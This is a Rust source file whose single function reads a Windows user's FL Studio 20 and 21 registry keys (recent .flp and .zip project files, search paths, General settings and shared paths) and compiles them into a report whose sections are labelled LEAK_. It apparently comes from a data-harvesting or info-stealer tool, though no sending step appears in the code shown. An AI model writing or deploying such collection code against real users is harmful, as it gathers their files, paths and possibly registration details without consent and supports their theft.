use winreg::enums::*;
use winreg::{RegKey};

pub fn leak_mru() -> String {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);


    // FL Studio 21
    let mut fl21mru_text = String::from("\nLEAK_FL21_MRU -> \n");
    match hkcu.open_subkey("Software\\Image-Line\\FL Studio 21\\MRU") {
        Ok(reg) => {
            for (name, value) in reg.enum_values().map(|x| x.unwrap()) {
                if value.to_string().to_lowercase().contains(".flp") {
                    fl21mru_text.push_str(&format!("    🥭 FLP | {:<4} {}\n", name, value));
                }
                if value.to_string().to_lowercase().contains(".zip") {
                    fl21mru_text.push_str(&format!("    📚 ZIP | {:<4} {}\n", name, value));
                }
            }
        }
        _ => {}
    }

    let mut fl21_search_path = String::from("\nLEAK_FL21_SEARCH_PATHS -> \n");
    match hkcu.open_subkey("Software\\Image-Line\\FL Studio 21\\Search paths") {
        Ok(reg) => {
            for (name, value) in reg.enum_values().map(|x| x.unwrap()) {
                fl21_search_path.push_str(format!("   📂 {:<4} | {} \n", name, value).as_str());
            }
        }
        _ => {}
    }

    let mut fl21general = String::from("\nLEAK_FL21_GENERAL -> \n");
    match hkcu.open_subkey("Software\\Image-Line\\FL Studio 21\\General") {
        Ok(reg) => {
            for (name, value) in reg.enum_values().map(|x| x.unwrap()) {
                fl21general.push_str(&format!("   🔑 {:<50} | {}\n", name, value));
            }
        }
        _ => {}
    }

    let mut fl21paths = String::from("\nLEAK_FL21_PATHS -> \n");
    match hkcu.open_subkey("Software\\Image-Line\\Shared\\Paths") {
        Ok(reg) => {
            for (name, value) in reg.enum_values().map(|x| x.unwrap()) {
                fl21paths.push_str(&format!("   📕 {:<40} | {}\n", name, value));
            }
        }
        _ => {}
    }



    // FL Studio 20
    let mut fl20mru_text = String::from("\nLEAK_FL20_MRU -> \n");
    match hkcu.open_subkey("Software\\Image-Line\\FL Studio 20\\MRU") {
        Ok(reg) => {
            for (name, value) in reg.enum_values().map(|x| x.unwrap()) {
                if value.to_string().to_lowercase().contains(".flp") {
                    fl20mru_text.push_str(&format!("    🥭 FLP | {:<4} {}\n", name, value));
                }
                if value.to_string().to_lowercase().contains(".zip") {
                    fl20mru_text.push_str(&format!("    📚 ZIP | {:<4} {}\n", name, value));
                }
            }
        }
        _ => {}
    }

    let mut fl20_search_path = String::from("\nLEAK_FL20_SEARCHPATHS -> \n");
    match hkcu.open_subkey("Software\\Image-Line\\FL Studio 20\\Search paths") {
        Ok(reg) => {
            for (name, value) in reg.enum_values().map(|x| x.unwrap()) {
                fl20_search_path.push_str(format!("   📂 {:<4} | {} \n", name, value).as_str());
            }
        }
        _ => {}
    }

    let mut fl20general = String::from("\nLEAK_FL20_GENERAL -> \n");
    match hkcu.open_subkey("Software\\Image-Line\\FL Studio 20\\General") {
        Ok(reg) => {
            for (name, value) in reg.enum_values().map(|x| x.unwrap()) {
                fl20general.push_str(&format!("   🔑 {:<50} | {}\n", name, value));
            }
        }
        _ => {}
    }

    let mut mru_content_comp = String::new();
    mru_content_comp.push_str(fl20mru_text.as_str());
    mru_content_comp.push_str(fl21mru_text.as_str());
    mru_content_comp.push_str(fl21_search_path.as_str());
    mru_content_comp.push_str(fl20_search_path.as_str());
    mru_content_comp.push_str(fl21general.as_str());
    mru_content_comp.push_str(fl20general.as_str());
    mru_content_comp.push_str(fl21paths.as_str());
    return mru_content_comp;
}